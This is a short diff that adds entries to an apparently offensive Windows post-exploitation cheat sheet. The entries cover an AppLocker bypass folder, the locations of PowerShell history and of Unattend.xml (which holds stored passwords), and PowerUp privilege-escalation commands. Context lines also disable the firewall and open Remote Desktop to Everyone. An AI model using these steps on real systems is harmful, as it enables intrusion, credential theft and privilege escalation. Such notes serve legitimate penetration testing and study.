@@ -23,3 +23,25 @@ netsh advfirewall set allprofiles state off
 net localgroup "Remote Desktop Users" Everyone /Add
 ```
 
+## Bypass Windows Applocker
+
+- Safer location for executing binaries.
+
+ `C:\Windows\System32\spool\drivers\color`
+
+# Powershell command history
+
+  `\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+
+# Users' passwords in base64 encoding.
+
+  `C:\Windows\Panther\Unattend\Unattended.xml`
+
+# Privilege Escalation
+
+- Use [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
+
+   ```powershell
+   . .\PowerUp.ps1
+  Invoke-AllChecks
+  ```
